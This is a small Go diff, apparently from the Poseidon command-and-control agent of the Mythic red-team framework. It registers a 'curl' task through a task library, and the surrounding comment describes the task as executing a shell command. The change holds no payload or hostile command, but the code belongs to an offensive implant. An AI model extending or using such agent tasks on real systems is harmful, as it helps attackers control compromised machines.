@@ -10,7 +10,12 @@ import (
 	// Poseidon
 
 	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils/structs"
+	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/tasks/library"
 )
+
+func init() {
+	library.RegisterTask("curl", Run)
+}
 
 // Run - Function that executes the shell command
 func Run(task structs.Task) {
